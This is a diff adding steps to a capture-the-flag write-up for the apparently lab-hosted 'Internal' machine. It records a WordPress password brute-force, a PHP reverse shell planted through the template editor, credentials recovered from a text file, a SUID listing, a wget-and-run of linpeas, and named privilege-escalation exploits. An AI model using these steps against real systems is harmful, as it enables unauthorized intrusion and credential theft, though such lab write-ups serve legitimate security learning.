@@ -99,22 +99,73 @@ http://internal.thm/server-status   (Status: 403) [Size: 277]
 
 [+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
 
+- Running wpxploit with default wordlist and admin ``./exploit.py http://internal.thm/wordpress/ 5 15`` gives us admin:my2boys for wordpress login.
 
+![](/assets/internal02.png)
 
 ### [](###header-3)Privilege Escalation Vulnerabilities
 
+- Found during linpeas scan Vulnerable to CVE-2021-4034
 - Found during ``wpscan`` - Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation | linux/local/46676.php
 
+1. insert php reverse shell into wordpress template editor and open up reverse shell ![](/assets/internal03.png)
 
+2. browse the machine.
+```shell
+$ cd opt
+$ ls
+containerd
+wp-save.txt
+$ cat wp-save.txt
+Bill,
 
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
 
+aubreanna:bubb13guM!@#123
 
+l:~$ cat jenkins.txt
+Internal Jenkins service is running on 172.17.0.2:8080
+```
+
+3. looks like we found Aubreanna's SSH creds, can login with these and get our user.txt flag. Don't leave passwords laying around... and also a Jenkins service? But now we can check privs and try to get root 
+- Ubuntu 18.04.4 LTS
+
+4. find SUID bits and we have a few
+```shell
+/bin/mount
+/bin/umount
+/bin/ping
+/bin/fusermount
+/bin/su
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/pkexec
+```
+5. ``uname -a`` gives us kernal information: ``Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux``
+6. lets wget and ./linpeas.sh on the machine to see what we missed...
+
+```shell
+Exploit: Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method)
+      URL: https://www.exploit-db.com/exploits/47167
+     Path: /usr/share/exploitdb/exploits/linux/local/47167.sh
+File Type: POSIX shell script, ASCII text executable
+```
 
 ##### [](#header-5)Answer the questions below
 
-User.txt Flag
+**User.txt Flag**
 
-Root.txt Flag
+![](/assets/internal04.png)
+
+**Root.txt Flag**
 
 * * *
 
